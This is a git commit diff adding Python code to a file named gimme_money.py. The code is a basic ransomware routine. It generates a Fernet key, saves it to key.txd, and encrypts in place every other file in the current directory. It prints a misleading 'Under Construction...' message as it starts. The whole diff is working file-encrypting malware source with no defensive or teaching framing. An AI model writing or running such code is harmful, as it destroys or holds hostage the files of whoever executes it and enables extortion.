47c8fc16d8b6cc0950449fa7f4c113a6e172e1e8
tanmay8146 <rv3nom@outlook.com>
2023-01-18 23:25:31 +0530

    day1

--- gimme_money.py
+++ gimme_money.py
@@ -1,8 +1,27 @@
+print("Under Construction...")
 import os
+from cryptography.fernet import Fernet
 
 files= []
 
 for file in os.listdir():
-    files.append(file)
+    if file == 'gimme_money.py' or file == 'key.txd':
+        continue
+    if os.path.isfile(file):
+        files.append(file)
 
-print(files)
+# print(files)
+
+KEY = Fernet.generate_key()
+# print(KEY)
+
+with open("key.txd", "wb") as thekey:
+    thekey.write(KEY)
+
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    content_encr = Fernet(KEY).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(content_encr)
+        
